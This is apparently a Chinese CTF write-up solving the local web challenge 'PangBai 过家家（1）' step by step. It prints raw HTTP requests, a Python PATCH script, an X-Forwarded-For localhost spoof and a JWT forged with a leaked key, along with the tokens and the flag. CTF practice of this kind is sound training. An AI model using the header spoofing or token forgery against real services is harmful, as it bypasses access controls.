---
title: 'Week1 Web 网络攻防'
date: '2025-04-19T17:50:42+08:00'
weight: 2
draft: false
description: "Week1 Web 网络攻防"
---

## headach3

## PangBai 过家家（1）

### Level 1：初出茅庐

**提示：PangBai 的头部（Header）里便隐藏着一些秘密，需要你主动去发现。**

根据提示检查之前 response 中的响应头信息，发现 `Location` 字段中给出了下一 Level 的地址，`Location: /da90daff-eac4-438a-8743-dee177700489`。

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_16-33-02.5c16cym26p.webp)

直接访问 `http://127.0.0.1:3307/da90daff-eac4-438a-8743-dee177700489` 进入 Level 2。

### Level 2: 云程发轫

**提示：向 PangBai 询问（Query）一下（ask=miao）吧 ~**

根据提示使用 GET 方法（在 URL 加入 `?parameter=value`）传入参数 `ask=miao`，直接访问 `http://127.0.0.1:3307/?ask=miao` 进入 Level 3。

### Level 3: 探赜索隐

**提示：用另一种方法（Method）打声招呼（say=hello）吧 ~**

常用的 request 方法有 GET 和 POST ，Level 2 使用了 GET 方法，根据提示这次使用 POST 方法传参 `say=hello`，`Content-Type` 选择 `application/x-www-form-urlencoded` 类型。

劫持请求：

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_17-10-20.491h241fge.webp)

修改请求：

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_17-12-04.9gwrp3wql4.webp)

进入 Level 4。

### Level 4: 不悱不发

**提示：你需要使用正确的方法（Method）来与 PangBai 沟通。**

由于 302 重定向的原因，此时 request 方法又变成了 GET，使用与 Level 3 相同的 POST 方法重新请求。

```text
POST /?ask=miao HTTP/1.1
Host: 127.0.0.1:3307
Sec-Fetch-Mode: navigate
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-mobile: ?0
sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Dest: document
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-User: ?1
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6NH0.g5672cQm3oc9BNuwUnE1yHl8UZQayXA2N_WDw4JbGQM
Content-Type: application/x-www-form-urlencoded

say=hello
```

**提示：PangBai 回应了呢！可只有 Papa 的话语才能让她感到安心。 代理人（Agent)，这个委托你就接了吧！**

劫持请求，`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36`，根据提示将 `Mozilla` 修改为 `Papa`。

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_17-24-18.73u57wyols.webp)

**提示：你的话语似乎没有对 PangBai 起效，试着说「玛卡巴卡阿卡哇卡米卡玛卡呣」。**

根据提示将 `say=hello` 替换为 `say=玛卡巴卡阿卡哇卡米卡玛卡呣`

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_17-26-53.51ecjv3cdj.webp)

进入 Level 5。

### Level 5: 渐入佳境

**提示：PangBai 依然对你比较警惕，因此「玛卡巴卡阿卡哇卡米卡玛卡呣」或许是不可省略的。**

根据提示，我们仍然需要传递参数 `say=玛卡巴卡阿卡哇卡米卡玛卡呣`，与 Level 4 相同，由于 302 重定向的原因，需要使用 POST 方法重新请求。

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_17-32-44.86tuit5fjr.webp)

**提示：这里便是 PangBai 的心境了呢！试着解开心结吧 ~ 或许可以尝试用修改（PATCH）的方法提交一个补丁包（name="file"; filename="*.zip"）试试。**

根据提示，我们需要使用 PATCH 方法提交一个补丁包，这里提供两种方法。

**1、利用 Python 的 requests 模块请求**

```python
import requests

url = 'http://127.0.0.1:3307/?ask=miao'

headers = {
    'Host': '127.0.0.1:3307',
    'Sec-Fetch-Site': 'none',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Mode': 'navigate',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Sec-Fetch-User': '?1',
    'User-Agent': 'Papa/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'sec-ch-ua-mobile': '?0',
    'Cache-Control': 'max-age=0',
    'Sec-Fetch-Dest': 'document',
    'Cookie': 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6NX0.aSNfpRjut2OiqeDG8CdhjCiqv2CensxCWsXEJO_ZSKw',
}

files = {'file': ('filename.zip', 'nothing to send')}

data = {'say': '玛卡巴卡阿卡哇卡米卡玛卡呣'}

session = requests.Session()

response = session.patch(url, headers=headers, files=files, data=data)

with open('response_text/level-5.txt', 'w', encoding='utf-8') as f:
    f.write(response.text)

print('Cookies:', session.cookies)
```

运行结果：
```text
RequestsCookieJar[<Cookie token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.D84JosG9QpYj69hSrIaH36ofPNNKZwRAyqr2n14y5LI for 127.0.0.1/>]>
```

在 Console 中使用 `document.cookie` 更新 cookie 值，刷新后进入 Level 6。

```text
document.cookie = "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.D84JosG9QpYj69hSrIaH36ofPNNKZwRAyqr2n14y5LI"
```

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_20-02-06.45hv4kdah5.webp)

### Level 6: 一方通行

**提示：还在等什么？距离成为 PangBai 的亲人（localhost）只有一步之遥了呢！ 这里的前方是一方通行啊！Level 6 可不是容易的！**

根据提示，我们需要通过 ***伪造请求头*** 的方式来模拟本地请求的特征，让服务器误以为请求来自 localhost（127.0.0.1）。

劫持请求，在请求头中添加 `X-Forwarded-For: localhost`

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_20-10-34.8hgoc47j2o.webp)

**提示：PangBai 以一种难以形容的表情望着你——激动的、怀念的，却带着些不安与惊恐，像落单后归家的雏鸟，又宛若雷暴中遇难的船员。 你似乎无法抵御这种感觉的萦绕，像是一瞬间被推入到无法言喻的深渊。尽管你尽力摆脱，但即便今后夜间偶见酣眠，这一瞬间塑成的梦魇也成为了美梦的常客。 「像■■■■验体■■不可能■■■■ JWT 这种■■ F4invkTHj8bU1BoH ■■■密钥，除非■■■■■走，难道■■■■■■吗？！」 「......」**

推测 `F4invkTHj8bU1BoH` 是 JWT (JSON Web Tokens) 的密钥，使用密钥可以在 [JWT](https://jwt.io/) 进行在线签名和验证（获取下一个 Level 的 token）。

将当前的 token 输入到 Encoded 可以看到里面的数据（这里显示 **Invalid Signature** 是因为没有输入正确的密钥）。

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_20-48-23.3rbfdqshqh.webp)

经过多次试验发现最后一关并不是 Level 7，而是 Level 0，使用密钥 `F4invkTHj8bU1BoH` 进行签名，获得 Level 0 的 token。

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-22_20-37-27.9nzzkqv5yd.webp)

在 Console 中使用 `document.cookie` 更新 cookie 值，刷新后进入 Level 0。

```text
document.cookie = "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MH0.7zPrTPLK3ZURtmd34FfByRYPm9a425XdcktwV5hFAvs"
```

### Level 0: 此心安处是吾乡

**提示：「PangBai！危险！PangBai！！PangBai！！！」 _<u>从梦中醒来</u>_**

点击 ***从梦中醒来*** 获得 `flag{79d688a9-c5f5-61c9-dda1-e101ad562ae4}`